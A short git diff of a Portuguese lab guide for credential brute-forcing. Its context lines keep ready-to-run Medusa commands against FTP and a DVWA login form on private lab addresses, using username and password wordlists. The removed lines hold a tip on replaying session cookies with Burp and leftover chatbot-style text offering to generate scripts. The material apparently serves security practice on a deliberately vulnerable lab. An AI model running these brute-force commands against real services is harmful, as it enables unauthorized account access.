@@ -313,13 +313,3 @@ medusa -h 192.168.56.101 -M ftp -U wordlists/usernames.txt -P wordlists/password
 ```
 # Comandos prontos: HTTP / DVWA (ajuste path/strings conforme seu DVWA)
 medusa -h 192.168.56.102 -M http -m FORM:POST:/dvwa/login.php:username=^USER^&password=^PASS^:Login\ failed -U wordlists/usernames.txt -P wordlists/passwords.txt -t 8 | tee outputs/medusa_dvwa_$(date +%F_%T).log
-
-# Se o site exigir um cookie de sessão ou CSRF, capture a requisição com Burp e replique os headers necessários ou use um script para reproduzir a sessão.
-```
-
----
-
-### Próximos passos sugeridos
-
-* Posso também gerar **scripts Bash** que executem os comandos e salvem logs automaticamente (`run_tests.sh`) e um `gitignore` apropriado para não subir arquivos sensíveis.
-* Quer que eu gere esses scripts agora no canvas? (Responda "sim" para que eu adicione `run_tests.sh` e `gitignore`.)
